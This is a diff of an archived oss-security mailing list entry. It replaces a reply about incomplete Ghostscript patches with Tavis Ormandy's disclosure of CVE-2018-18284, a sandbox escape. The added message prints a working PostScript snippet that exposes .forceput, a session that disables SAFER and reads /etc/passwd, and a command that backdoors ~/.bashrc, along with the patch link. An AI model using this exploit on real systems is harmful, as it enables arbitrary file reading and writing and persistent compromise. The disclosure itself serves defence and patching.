@@ -1,38 +1,77 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/27/5
-Message-ID: <20180827194351.76ac39c6@jabberwock.cb.piermont.com>
-Date: Mon, 27 Aug 2018 19:43:51 -0400
-From: "Perry E. Metzger" <perry@...rmont.com>
-To: Tavis Ormandy <taviso@...gle.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/17/10
+Message-ID: <CAJ_zFk+Db=VQi14vEfA8AeRbqEfROwApCbgVqPQny7qbhj7nhw@mail.gmail.com>
+Date: Wed, 17 Oct 2018 13:48:53 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284
 Content-Type: text/plain; charset=utf-8
 
-On Mon, 27 Aug 2018 16:02:46 -0700 Tavis Ormandy <taviso@...gle.com>
-wrote:
-> Here is an update, Artifex made a press release
-> <https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930>
-> listing
-> some necessary commits, but the list was incomplete.
+Apparently it wasn't clear that this allowed reading and writing of
+arbitrary files, here is a full exploit (I just modified the CVE-2018-17961
+exploit).
 
-They also claimed "Artifex Software is pleased to report that the
-recently disclosed security vulnerabilities in Ghostscript have been
-resolved.", which, even if they were all patched in their git
-repository, which they don't seem to all be, would still not really
-be true given the lack of an actual release.
+$ convert executeonly-bypass.pdf exploit.jpg
+$ tail -1 ~/.bashrc
+echo pwned by postscript
 
-> Here is a list of relevant commits I'm aware of so far, some issues
-> are still open with working exploits available. It's my
-> understanding that no new release is planned until late September,
-> and vendors need to either ship a git snapshot when all issues are
-> resolved, or apply patches. I have testcases for each problem, but
-> I think the bugs will be visible eventually so I'm not posting them
-> here.
 
-If someone would put a git repo onto GitHub with all the available
-patches applied on a branch, I'm sure a bunch of people would be
-grateful.
+Thanks, Tavis.
 
-Perry
--- 
-Perry E. Metzger		perry@...rmont.com
+
+On Tue, Oct 16, 2018 at 11:06 AM Tavis Ormandy <taviso@...gle.com> wrote:
+
+> Hello, this
+> <https://bugs.chromium.org/p/project-zero/issues/detail?id=1696> is
+> CVE-2018-18284, another ghostscript sandbox escape. Because procedures in
+> postscript are just executable arrays, all system procedures need to be
+> marked as executeonly, so that users cannot peek at their internals with
+> array operators.
+>
+> We have also recently learned that they must be marked as
+> pseudo-operators, otherwise their contents might leak to error handlers.
+>
+> That makes sense, unless the procedure itself is dangerous - in that case
+> it must be hidden.
+>
+> 1Policy is a procedure that was correctly marked as executeonly and made a
+> pseudo-operator, but was basically just a wrapper around .forceput. Here is
+> how to exploit it:
+>
+> /.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
+> get exec pop pop pop pop pop pop pop } def
+>
+> Once you have access to .forceput, you can basically do whatever you want,
+> see the exploit for CVE-2018-17961 a full example of backdooring .bashrc.
+>
+> Here is a simpler repro, just reading /etc/passwd:
+>
+> $ gs -dSAFER -sDEVICE=ppmraw
+> GPL Ghostscript 9.25 (2018-09-13)
+> Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+> This software comes with NO WARRANTY: see the file PUBLIC for details.
+> GS>/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
+> get exec pop pop pop pop pop pop pop } def
+> GS>systemdict /SAFER false .forceput
+> GS>systemdict /userparams get /PermitFileControl [(*)] .forceput
+> GS>systemdict /userparams get /PermitFileWriting [(*)] .forceput
+> GS>systemdict /userparams get /PermitFileReading [(*)] .forceput
+> GS>(/etc/passwd) (r) file 1024 string readline pop ==
+> (root:x:0:0:root:/root:/bin/bash)
+> GS>
+>
+> This patch solves it:
+>
+>
+> http://git.ghostscript.com/?p=ghostpdl.git;h=8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b
+>
+> Side note: I'm done looking at ghostscript for now, but still *strongly*
+> recommend that we deprecate untrusted postscript and disable ghostscript
+> coders by default in policy.xml.
+>
+> Thanks, Tavis.
+>
+
+Content of type "text/html" skipped
+
+Download attachment "executeonly-bypass.pdf" of type "application/pdf" (1970 bytes)
